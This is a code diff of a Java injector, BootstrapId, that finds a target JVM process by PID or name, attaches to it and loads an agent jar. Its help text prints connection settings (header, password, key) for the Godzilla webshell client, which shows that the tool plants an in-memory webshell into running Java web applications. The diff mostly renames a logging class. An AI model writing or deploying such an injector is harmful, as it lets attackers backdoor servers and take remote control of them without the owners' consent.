@@ -1,3 +1,5 @@
+package com;
+
 import com.sun.tools.attach.VirtualMachine;
 
 import java.io.BufferedReader;
@@ -20,7 +22,7 @@ public class BootstrapId {
             // Auto find target process
             String pid = findTargetPID(args[0]);
             if (pid == null) {
-                AgentMainTest.logger.warning("[-] Target PID not found.");
+                Constant001.logger.warning("[-] Target PID not found.");
                 System.exit(1);
             }
 
@@ -28,35 +30,35 @@ public class BootstrapId {
             String jar = getJar(BootstrapId.class);
 
             // Attach to target process
-            AgentMainTest.logger.info("[+] Trying to attach to process: " + pid);
+            Constant001.logger.info("[+] Trying to attach to process: " + pid);
             VirtualMachine vm = VirtualMachine.attach(pid);
             vm.loadAgent(jar);
             vm.detach();
 
-            AgentMainTest.logger.info("[√] Agent successfully loaded into process: " + pid);
+            Constant001.logger.info("[√] Agent successfully loaded into process: " + pid);
         }
         catch (Exception e) {
-            AgentMainTest.logger.severe(e.getMessage());
+            Constant001.logger.severe(e.getMessage());
             throw new RuntimeException(e);
         }
     }
 
     public static void printHelp(String[] args) {
         if (args.length != 1) {
-            AgentMainTest.logger.info("Usage: java -jar xxx.jar [id|processName]");
+            Constant001.logger.info("Usage: java -jar xxx.jar [id|processName]");
             System.out.println();
-            AgentMainTest.logger.info("Examples:");
-            AgentMainTest.logger.info("  java -jar xxx.jar 123456         # PID");
-            AgentMainTest.logger.info("  java -jar xxx.jar web.jar        # processLine.contains(arg.toLowerCase(jarName))");
-            AgentMainTest.logger.info("  java -jar xxx.jar Application    # processLine.contains(arg.toLowerCase(mainClassName))");
+            Constant001.logger.info("Examples:");
+            Constant001.logger.info("  java -jar xxx.jar 123456         # PID");
+            Constant001.logger.info("  java -jar xxx.jar web.jar        # processLine.contains(arg.toLowerCase(jarName))");
+            Constant001.logger.info("  java -jar xxx.jar Application    # processLine.contains(arg.toLowerCase(mainClassName))");
             System.out.println();
-            AgentMainTest.logger.info("Tips:");
-            AgentMainTest.logger.info("  use jps -l to list Java processes");
-            AgentMainTest.logger.info("  linux: ps -eo pid,cmd | grep '[j]ava'");
-            AgentMainTest.logger.info("  windows: jps -l");
-            AgentMainTest.logger.info("  godzilla:\n\t" +AgentMainTest.HEADER_PARAM+ ": " +AgentMainTest.HEADER_PARAM_VALUE+ "\n\tpassword: pass\n\tkey: key");
+            Constant001.logger.info("Tips:");
+            Constant001.logger.info("  use jps -l to list Java processes");
+            Constant001.logger.info("  linux: ps -eo pid,cmd | grep '[j]ava'");
+            Constant001.logger.info("  windows: jps -l");
+            Constant001.logger.info("  godzilla:\n\t" +Constant001.HEADER_PARAM+ ": " +Constant001.HEADER_PARAM_VALUE+ "\n\tpassword: "+ Constant001.PASSWORD +"\n\tkey: " + Constant001.SECRET_KEY + " ");
             System.err.println();
-            AgentMainTest.logger.info("  When starting the agent, the JDK version must match the JDK version of the target application.\n" +
+            Constant001.logger.info("  When starting the agent, the JDK version must match the JDK version of the target application.\n" +
                     "For example, if the target project is running on JDK 17, the agent must also be started using JDK 17.");
             System.exit(1); // 直接退出程序
         }
@@ -121,7 +123,7 @@ public class BootstrapId {
                 if (pid == null || mainClass == null) continue;
 
                 // Exclude self process
-                if (mainClass.contains("BootstrapId")) continue;
+                if (mainClass.contains("com.BootstrapId")) continue;
 
                 // Match target process
                 if (mainClass.toLowerCase().contains(arg.toLowerCase())) {
@@ -130,20 +132,20 @@ public class BootstrapId {
             }
 
             if (candidates.isEmpty()) {
-                AgentMainTest.logger.warning("[-] No target Java process found. Make sure JVM is running and argument is correct.");
+                Constant001.logger.warning("[-] No target Java process found. Make sure JVM is running and argument is correct.");
                 return null;
             }
 
-            AgentMainTest.logger.info("[*] Detected candidate Java processes:");
+            Constant001.logger.info("[*] Detected candidate Java processes:");
             for (String c : candidates) {
-                AgentMainTest.logger.info("    " + c);
+                Constant001.logger.info("    " + c);
             }
 
             // Return the first candidate PID
             return candidates.get(0).split(" ")[0];
 
         } catch (Exception e) {
-            AgentMainTest.logger.severe(e.getMessage());
+            Constant001.logger.severe(e.getMessage());
             throw new RuntimeException("Failed to get JVM process list: " + e.getMessage(), e);
         }
     }
